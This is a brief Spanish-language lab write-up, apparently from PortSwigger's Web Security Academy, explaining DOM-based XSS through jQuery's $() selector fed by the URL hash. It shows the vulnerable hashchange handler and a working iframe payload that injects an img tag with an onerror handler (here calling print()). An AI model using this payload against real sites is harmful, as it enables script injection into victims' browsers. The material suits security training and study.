En este caso se utiliza la sencia `$()` de jquery para buscar titulos dentro de la web y scrolear hasta llegar al mismo utilizando esta funcion
```js
$(window).on('hashchange', function(){
	var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
	if (post) post.get(0).scrollIntoView(); });
```

Por lo que podemos redirigir a la victima a una web maliciosa pero el payload debe introducirse de manera posterior a la carga de la web ya que es el momento donde se ejecuta la función y ademas se necesita el # que se usa para hacer dicha busqueda

```js
<iframe src="https://0abf00e7034e739480738030001c0006.web-security-academy.net/#" onload="this.src += '<img src=0 onerror=print()>'"></iframe>
```